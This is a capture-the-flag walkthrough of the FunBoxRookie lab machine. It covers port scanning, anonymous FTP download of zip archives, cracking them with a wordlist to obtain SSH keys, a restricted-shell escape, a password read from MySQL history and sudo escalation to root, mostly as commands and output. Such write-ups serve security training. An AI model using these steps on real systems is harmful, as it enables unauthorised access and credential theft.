# FunBoxRookie

```shell
> rustscan -b 1000 -u 5000 -r 0-65535 -a 192.168.172.107
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
With RustScan, I scan ports so fast, even my firewall gets whiplash 💨

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.172.107:21
Open 192.168.172.107:22
Open 192.168.172.107:80
[~] Starting Script(s)
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2024-08-09 01:41 EDT
Initiating Ping Scan at 01:41
Scanning 192.168.172.107 [2 ports]
Completed Ping Scan at 01:41, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:41
Completed Parallel DNS resolution of 1 host. at 01:41, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 01:41
Scanning 192.168.172.107 [3 ports]
Discovered open port 80/tcp on 192.168.172.107
Discovered open port 22/tcp on 192.168.172.107
Discovered open port 21/tcp on 192.168.172.107
Completed Connect Scan at 01:41, 0.10s elapsed (3 total ports)
Nmap scan report for 192.168.172.107
Host is up, received syn-ack (0.093s latency).
Scanned at 2024-08-09 01:41:35 EDT for 1s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.31 seconds
```

```shell
> rustscan -b 1000 -u 5000 -r 0-65535 -a 192.168.172.107 -- -sC -sV                                                                                            
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.                                                                                                       
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |                                                                                                       
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |                                                                                                       
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'                                                                                                       
The Modern Day Port Scanner.                                                                                                                                   
________________________________________                                                                                                                       
: http://discord.skerritt.blog         :                                                                                                                       
: https://github.com/RustScan/RustScan :                                                                                                                       
 --------------------------------------                                                                                                                        
Open ports, closed hearts.                                                                                                                                     
                                                                                                                                                               
[~] The config file is expected to be at "/home/superuser/.rustscan.toml"                                                                                      
[~] Automatically increasing ulimit value to 5000.
Open 192.168.172.107:21                                                                                                                                        
Open 192.168.172.107:22                                                                                                                                        
Open 192.168.172.107:80                                                                                                                                        
[~] Starting Script(s)                                                                                                                                         
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sC -sV" on ip 192.168.172.107                                                                                
Depending on the complexity of the script, results may take some time to appear.                                                                               
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2024-08-09 01:43 EDT                                                                                            
NSE: Loaded 156 scripts for scanning.                                                                                                                          
NSE: Script Pre-scanning.                                                                                                                                      
NSE: Starting runlevel 1 (of 3) scan.                                                                                                                          
Initiating NSE at 01:43                                                                                                                                        
Completed NSE at 01:43, 0.00s elapsed                                                                                                                          
NSE: Starting runlevel 2 (of 3) scan.                                                                                                                          
Initiating NSE at 01:43                                                                                                                                        
Completed NSE at 01:43, 0.00s elapsed                                                                                                                          
NSE: Starting runlevel 3 (of 3) scan.                                                                                                                          
Initiating NSE at 01:43                                                                                                                                        
Completed NSE at 01:43, 0.00s elapsed                                                                                                                          
Initiating Ping Scan at 01:43                                                                                                                                  
Scanning 192.168.172.107 [2 ports]                                                                                                                             
Completed Ping Scan at 01:43, 0.10s elapsed (1 total hosts)                                                                                                    
Initiating Parallel DNS resolution of 1 host. at 01:43                                                                                                         
Completed Parallel DNS resolution of 1 host. at 01:43, 0.01s elapsed                                                                                           
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]                                                               
Initiating Connect Scan at 01:43
Scanning 192.168.172.107 [3 ports]                                                                                                                             
Discovered open port 22/tcp on 192.168.172.107                                                                                                                 
Discovered open port 80/tcp on 192.168.172.107
Discovered open port 21/tcp on 192.168.172.107
Completed Connect Scan at 01:43, 0.10s elapsed (3 total ports)
Initiating Service scan at 01:43
Scanning 3 services on 192.168.172.107
Completed Service scan at 01:43, 6.20s elapsed (3 services on 1 host)
NSE: Script scanning 192.168.172.107.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 01:43
NSE: [ftp-bounce 192.168.172.107:21] PORT response: 500 Illegal PORT command
Completed NSE at 01:43, 3.13s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 01:43
Completed NSE at 01:43, 0.78s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 01:43
Completed NSE at 01:43, 0.00s elapsed
Nmap scan report for 192.168.172.107
Host is up, received syn-ack (0.097s latency).
Scanned at 2024-08-09 01:43:28 EDT for 11s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack ProFTPD 1.3.5e
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 anna.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 ariel.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 bud.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 cathrine.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 homer.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 jessica.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 john.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 marge.zip
| -rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 miriam.zip
| -r--r--r--   1 ftp      ftp          1477 Jul 25  2020 tom.zip
| -rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
|_-rw-rw-r--   1 ftp      ftp          1477 Jul 25  2020 zlatan.zip
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f9:46:7d:fe:0c:4d:a9:7e:2d:77:74:0f:a2:51:72:51 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMD7EHN/CpFOxv4hW16hSiL9/hrqfgN7N5gfqvnRwCeDJ8jj4kzV9XNVm/NN3u+fE7zrclQWDtGRu4oryuQv+25XjPJG7z+OdJ6ncD8k/VyHm3ncPIt1skZ
NTe8WGR9BGHf2dSvyEgW6Iu2TqICR+Vak48KdMIbmjCo8jbiAx4pNvUjkv7z+vzmr3wJakRhiIa2aA7TFeAVe5o9/Se6IOc/I4ByXcarmeU6hOytDb8qmUSYxSV1nea1jYKinXgCZ7MpAoFB8qPtiy4wryzBgss
jAiqAFPEmPjaU96hDAsGMeQ0yFLeCoDTxeY8xnc+oWjU/mm1ISbiJ/IqX2N81xtP
|   256 15:00:46:67:80:9b:40:12:3a:0c:66:07:db:1d:18:47 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHG2MCQtlbU+bwb4Cuz2xWoPH4/WBRJtUP5pDp8LQM175mj/IP9ORztHIBB+dyfrCshyxnFcIFc35MXp2qhgJ
FM=
|   256 75:ba:66:95:bb:0f:16:de:7e:7e:a1:7b:27:3b:b0:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFhzTG7CoqPllLoboDB4lTrHUfFJLHbEWIRUP1lMA4rT
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/logs/
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 01:43
Completed NSE at 01:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 01:43
Completed NSE at 01:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 01:43
Completed NSE at 01:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.90 seconds
```

## FTP
```shell
> ftp 192.168.172.107
Connected to 192.168.172.107.
220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.172.107]
Name (192.168.172.107:superuser): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230-Welcome, archive user anonymous@192.168.45.224 !
230-
230-The local time is: Fri Aug 09 07:47:29 2024
230-
230-This is an experimental FTP server.  If you have any unusual problems,
230-please report them via e-mail to <root@funbox2>.
230-
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
229 Entering Extended Passive Mode (|||45500|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4.0k Jul 25  2020 .
drwxr-xr-x   2 ftp      ftp          4.0k Jul 25  2020 ..
-rw-r--r--   1 ftp      ftp           153 Jul 25  2020 .@admins
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 anna.zip
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 ariel.zip
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 bud.zip
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 cathrine.zip
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 homer.zip
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 jessica.zip
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 john.zip
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 marge.zip
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 miriam.zip
-r--r--r--   1 ftp      ftp          1.4k Jul 25  2020 tom.zip
-rw-r--r--   1 ftp      ftp           114 Jul 25  2020 .@users
-rw-r--r--   1 ftp      ftp           170 Jan 10  2018 welcome.msg
-rw-rw-r--   1 ftp      ftp          1.4k Jul 25  2020 zlatan.zip
226 Transfer complete
```

```shell
ftp> get .@admins
local: .@admins remote: .@admins
229 Entering Extended Passive Mode (|||10278|)
150 Opening BINARY mode data connection for .@admins (153 bytes)
100% |******************************************************************************************************************|   153        2.75 MiB/s    00:00 ETA
226 Transfer complete
153 bytes received in 00:00 (1.46 KiB/s
```

```shell
ftp> get .@users
local: .@users remote: .@users
229 Entering Extended Passive Mode (|||22935|)
150 Opening BINARY mode data connection for .@users (114 bytes)
100% |******************************************************************************************************************|   114        1.84 MiB/s    00:00 ETA
226 Transfer complete
114 bytes received in 00:00 (1.15 KiB/s)
```
![image](https://github.com/user-attachments/assets/38f6c93a-4dc7-4e78-8bcf-3c83ad60c9a6)

Download all zip files:
```shell
ftp> prompt
Interactive mode off.
ftp> mget *
```

```shell
ftp> prompt                                                                                                                                                    
Interactive mode off.                                                                                                                                          
ftp> mget *                                                                                                                                                    
local: jessica.zip remote: jessica.zip                                                                                                                         
229 Entering Extended Passive Mode (|||16029|)                                                                                                                 
150 Opening BINARY mode data connection for jessica.zip (1477 bytes)                                                                                           
100% |******************************************************************************************************************|  1477       32.01 MiB/s    00:00 ETA 
226 Transfer complete                                                                                                                                          
1477 bytes received in 00:00 (13.36 KiB/s)                                                                                                                     
local: bud.zip remote: bud.zip                                                                                                                                 
229 Entering Extended Passive Mode (|||27241|)                                                                                                                 
150 Opening BINARY mode data connection for bud.zip (1477 bytes)                                                                                               
100% |******************************************************************************************************************|  1477       23.87 MiB/s    00:00 ETA 
226 Transfer complete                                                                                                                                          
1477 bytes received in 00:00 (13.56 KiB/s)                                                                                                                     
local: marge.zip remote: marge.zip                                                                                                                             
229 Entering Extended Passive Mode (|||56148|)                                                                                                                 
150 Opening BINARY mode data connection for marge.zip (1477 bytes)                                                                                             
100% |******************************************************************************************************************|  1477       15.14 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (13.85 KiB/s)
local: homer.zip remote: homer.zip
229 Entering Extended Passive Mode (|||24880|)
150 Opening BINARY mode data connection for homer.zip (1477 bytes)
100% |******************************************************************************************************************|  1477       32.01 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (14.43 KiB/s)
local: john.zip remote: john.zip
229 Entering Extended Passive Mode (|||64341|)
150 Opening BINARY mode data connection for john.zip (1477 bytes)
100% |******************************************************************************************************************|  1477       27.61 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (12.91 KiB/s)
local: cathrine.zip remote: cathrine.zip
229 Entering Extended Passive Mode (|||55034|)
150 Opening BINARY mode data connection for cathrine.zip (1477 bytes)
100% |******************************************************************************************************************|  1477      136.29 KiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (13.02 KiB/s)
local: ariel.zip remote: ariel.zip
229 Entering Extended Passive Mode (|||25135|)
150 Opening BINARY mode data connection for ariel.zip (1477 bytes)
100% |******************************************************************************************************************|  1477       22.35 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (13.90 KiB/s)
local: anna.zip remote: anna.zip
229 Entering Extended Passive Mode (|||25872|)
150 Opening BINARY mode data connection for anna.zip (1477 bytes)
100% |******************************************************************************************************************|  1477       30.62 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (14.50 KiB/s)
local: welcome.msg remote: welcome.msg
229 Entering Extended Passive Mode (|||40133|)
150 Opening BINARY mode data connection for welcome.msg (170 bytes)
100% |******************************************************************************************************************|   170        1.19 MiB/s    00:00 ETA
226 Transfer complete
170 bytes received in 00:00 (1.63 KiB/s)
local: tom.zip remote: tom.zip
229 Entering Extended Passive Mode (|||10886|)
150 Opening BINARY mode data connection for tom.zip (1477 bytes)
100% |******************************************************************************************************************|  1477       36.11 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (14.34 KiB/s)
local: zlatan.zip remote: zlatan.zip
229 Entering Extended Passive Mode (|||56847|)
150 Opening BINARY mode data connection for zlatan.zip (1477 bytes)
100% |******************************************************************************************************************|  1477       32.75 MiB/s    00:00 ETA
226 Transfer complete
1477 bytes received in 00:00 (13.80 KiB/s)
```

Crack downloaded .zip file:
```shell
> for file in *.zip;
for> do echo "Cracking $file..."
for> fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt "$file" || true
for> done
Cracking file anna.zip
found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
Cracking file ariel.zipeerat                        
found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
Cracking file bud.zipaneerat                        
found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
Cracking file cathrine.zipat                        
found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)


PASSWORD FOUND!!!!: pw == catwoman
Cracking file homer.zip
found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
Cracking file jessica.ziprat                        
found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
Cracking file john.zipneerat                        
found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
Cracking file marge.zipeerat                        
found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
Cracking file miriam.ziperat                        
found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
Cracking file tom.zipaneerat                        
found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)


PASSWORD FOUND!!!!: pw == iubire
Cracking file zlatan.zip
found file 'id_rsa', (size cp/uc   1299/  1675, flags 9, chk 554b)
```
![image](https://github.com/user-attachments/assets/19bd2395-68bd-404c-837b-bc38c1db96b9)

SSH Keys
```shell
> unzip -P catwoman cathrine.zip
Archive:  cathrine.zip
  inflating: id_rsa
> chmod 600 id_rsa                                                                                                                                             
> ssh -i id_rsa cathrine@192.168.172.107                                                                                                                       
Connection closed by 192.168.172.107 port 22                
```

```shell
> unzip -P iubire tom.zip                                                                                                                                      
Archive:  tom.zip                                                                                                                                              
  inflating: id_rsa                                                                                                                                            
> chmod 600 id_rsa                                                                                                                                             
> ssh -i id_rsa tom@192.168.172.107
```

```shell
tom@funbox2:~$ ls -lah
total 44K
drwxr-xr-x 5 tom  tom  4.0K Aug  9 08:03 .
drwxr-xr-x 3 root root 4.0K Jul 25  2020 ..
-rw------- 1 tom  tom     5 Aug  9 08:05 .bash_history
-rw-r--r-- 1 tom  tom   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tom  tom  3.7K Apr  4  2018 .bashrc
drwx------ 2 tom  tom  4.0K Aug  9 08:03 .cache
drwx------ 3 tom  tom  4.0K Jul 25  2020 .gnupg
-rw-r--r-- 1 tom  tom    33 Aug  9 05:39 local.txt
-rw------- 1 tom  tom   295 Jul 25  2020 .mysql_history
-rw-r--r-- 1 tom  tom   807 Apr  4  2018 .profile
drwx------ 2 tom  tom  4.0K Jul 25  2020 .ssh
```

Restricted Bash
```shell
tom@funbox2:~$ script /dev/null -c bash
Script started, file is /dev/null
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@funbox2:~$ cat local.txt 
*63464da9e2248378ab066d46c473827
```

```shell
tom@funbox2:~$ cat .mysql_history 
_HiStOrY_V2_
show\040databases;
quit
create\040database\040'support';
create\040database\040support;
use\040support
create\040table\040users;
show\040tables
;
select\040*\040from\040support
;
show\040tables;
select\040*\040from\040support;
insert\040into\040support\040(tom,\040xx11yy22!);
quit
```

```sql
tom@funbox2:~$ mysql -u tom -p                                                                                                                                 
Enter password:                                                                                                                                                
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2
Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| support            |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use support;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------+
| Tables_in_support |
+-------------------+
| support           |
+-------------------+
1 row in set (0.00 sec)

mysql> select * from support;
Empty set (0.00 sec)
```

```shell
tom@funbox2:~$ sudo -l
[sudo] password for tom: 
Matching Defaults entries for tom on funbox2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tom may run the following commands on funbox2:
    (ALL : ALL) ALL
```

```shell
tom@funbox2:~$ sudo -i
root@funbox2:~# ls
flag.txt  proof.txt
root@funbox2:~# cat flag.txt
Your flag is in another file...
root@funbox2:~# cat proof.txt
*6ff20a9e05c5529d2fa524377a026e2
```
